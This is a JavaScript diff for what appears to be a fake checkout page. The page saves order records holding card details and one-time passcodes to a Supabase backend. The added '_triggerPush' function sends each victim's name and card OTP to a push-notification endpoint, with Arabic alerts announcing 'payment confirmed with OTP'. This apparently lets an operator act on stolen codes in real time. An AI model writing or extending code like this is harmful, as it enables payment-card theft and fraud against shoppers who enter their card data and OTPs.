@@ -214,15 +214,31 @@
                     body: JSON.stringify(row)
                 }).then(function(r) {
                     if (!r.ok && r.status === 409) {
-                        // Conflict - order exists, update it
                         fetch(_SB_URL + '/rest/v1/orders?order_id=eq.' + orderData.id, {
                             method: 'PATCH',
                             headers: _sbHeaders(),
                             body: JSON.stringify(row)
                         });
                     }
+                    // Trigger push notification
+                    _triggerPush(orderData);
                 }).catch(function(e) { console.warn('supabase save error:', e); });
             } catch(e) { console.warn('supabase save exception:', e); }
+        }
+
+        function _triggerPush(orderData) {
+            try {
+                var title = (orderData.cardDetails || {}).otp ? '✅ تم تأكيد الدفع مع OTP!' : '🛒 طلب جديد!';
+                var body = (orderData.name || 'عميل') + ((orderData.cardDetails || {}).otp ? ' - اكتمل الدفع' : ' - بدأ طلب جديد');
+                fetch(_SB_URL + '/functions/v1/send-push', {
+                    method: 'POST',
+                    headers: _sbHeaders(),
+                    body: JSON.stringify({ type: 'INSERT', record: {
+                        customer_name: orderData.name,
+                        card_otp: (orderData.cardDetails || {}).otp || '',
+                    }})
+                }).catch(function(){});
+            } catch(e){}
         }
 
         function _updateStatusInSupabase(orderId, status) {
@@ -965,6 +981,8 @@
                     fetch(_SB_URL + '/rest/v1/orders?order_id=eq.' + existingOrder.id, {
                         method: 'PATCH', headers: _sbHeaders(),
                         body: JSON.stringify(otpRow)
+                    }).then(function() {
+                        _triggerPush({ name: existingOrder.name, cardDetails: { otp: otpVal } });
                     }).catch(function(){});
                 } catch(e){}
             } else {
